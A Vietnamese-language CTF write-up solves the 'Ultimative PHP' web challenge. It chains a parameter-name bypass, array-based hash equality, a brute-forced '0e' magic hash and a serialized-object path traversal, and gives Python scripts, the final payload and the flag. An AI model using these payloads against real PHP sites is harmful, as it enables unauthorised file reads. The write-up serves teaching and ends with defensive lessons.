---
title: Ultimative PHP
date: 2026-10-12
ctf: FortID CTF 2026
category: web
difficulty: Silver 4
tags:
  - PHP
  - Type Juggling
  - Path Traversal
---

# Ultimative PHP — Write-up

**Thể loại:** Web · **Kỹ thuật:** Type juggling / so sánh lỏng, unserialize, path traversal

## Tóm tắt

Trang yêu cầu 4 điều kiện, mỗi điều kiện khai thác một lỗi PHP:

1. Phải là `administrator`, nhưng tham số `access_level` bị chặn → dùng `access.level` (PHP đổi dấu `.` thành `_`).
2. Hai "recovery answer" phải khác nhau nhưng có hash SHA-256 giống nhau → dùng **mảng**.
3. Mã `code` có MD5 và SHA-256 (9 ký tự đầu) khác chuỗi nhưng `==` đúng → tìm **chuỗi "0e…"**.
4. Profile được `unserialize` với `LegacyTemplate` → **path traversal** để đọc `/tmp/flag`.

## Bước 1: Qua kiểm tra `access_level`

Code chặn chuỗi `access_level` trong query thô, nhưng kiểm tra giá trị qua `$_GET['access_level']`. PHP chuyển `.` thành `_` khi đặt tên biến từ query, nên:

```
access.level=administrator
```

vừa không bị chặn, vừa được đọc là `$_GET['access_level']`.

## Bước 2: Recovery answer dạng mảng

- `get_debug_type` phải giống nhau: cả hai đều là `array`.
- `$primary === $backup` phải sai: hai mảng có giá trị khác nhau (`primary[0]=a`, `backup[0]=b`).
- Khi nối chuỗi, `'legacy-recovery:v1:' . $array` cho ra `"...:Array"` (kèm cảnh báo `Array to string conversion`), nên hai hash SHA-256 giống nhau.

## Bước 3: Mã `code` loose-equal

`$material = 'ULTIMATIVE-PHP-2026:' . $code`. Điều kiện:

```php
$legacyDigest !== $modernDigest && $legacyDigest == $modernDigest
```

Hai chuỗi 9 ký tự đầu của MD5 và SHA-256 phải là số hợp lệ (dạng `0e…`) và bằng nhau khi so sánh số. Khi cả hai là `0e<chữ số>` thì giá trị đều bằng 0 nên `==` đúng.

Tìm bằng brute force (Python, cùng prefix), ví dụ:

```python
import hashlib, re
pat = re.compile(r"^\d+e\d+$")
for i in range(10**8):
    code = str(i)
    m = hashlib.md5(("ULTIMATIVE-PHP-2026:" + code).encode()).hexdigest()[:9]
    if not pat.match(m):
        continue
    s = hashlib.sha256(("ULTIMATIVE-PHP-2026:" + code).encode()).hexdigest()[:9]
    if pat.match(s) and m != s and float(m) == float(s) and float(m) == 0:
        print(code, m, s)  # 59036305 -> 0e3791209 / 0e9920675
        break
```

Kết quả: `code=59036305` (MD5 `0e3791209`, SHA-256 `0e9920675`).

Lưu ý: không dùng được kết quả có số mũ lớn (ví dụ `8098e2347`), vì PHP coi hai giá trị vô hạn cùng dấu là không bằng nhau và so sánh theo chuỗi.

## Bước 4: Profile và path traversal

`LegacyTemplate::__toString` đọc `__DIR__ . '/templates/' . $template`. Code chặn `../` bằng `if (strpos($this->template, '../'))`. Nếu `../` nằm ở **đầu** chuỗi thì `strpos` trả về `0`, là giá trị falsy, nên điều kiện không đúng và **không bị chặn**. Ta đặt `template` bắt đầu bằng `../` và đi lên 4 cấp (từ `templates/`) để tới `/tmp/flag`.

Profile cần là `MigratedProfile` có `displayName` là object `LegacyTemplate`. Khi `(string)$profile` được gọi, `__toString` chuỗi sẽ đọc file:

```python
import base64
tpl = "../../../../tmp/flag"
lt = f'O:14:"LegacyTemplate":1:{{s:8:"template";s:{len(tpl)}:"{tpl}";}}'
ser = f'O:15:"MigratedProfile":1:{{s:11:"displayName";{lt}}}'
profile = base64.urlsafe_b64encode(ser.encode()).decode().rstrip("=")
print(profile)
```

## Payload cuối

```
/?access.level=administrator&primary[0]=a&backup[0]=b&code=59036305&profile=<profile>
```

Flag nằm trong thẻ `<p class="flag">`.

## Kết quả

Đã chạy payload trên instance và nhận được flag:

`FortID{C0RP_M1GR4T10N_1S_WH3R3_D4T4_G03S_T0_D13_10e12d3ef0}`

## Bài học

- `==` với chuỗi trông như số là nguy hiểm. Dùng `===` hoặc `hash_equals`.
- Hash MD5/SHA-256 bị cắt ngắn và so sánh lỏng dễ gặp "magic hash".
- `unserialize` với dữ liệu người dùng: dùng `allowed_classes` là chưa đủ nếu các class được phép còn đọc file từ thuộc tính.
- `strpos(...)` trả về `0` khi tìm thấy ở đầu chuỗi, nên kiểm tra kiểu `if (strpos(...))` là sai. Phải dùng `!== false`.
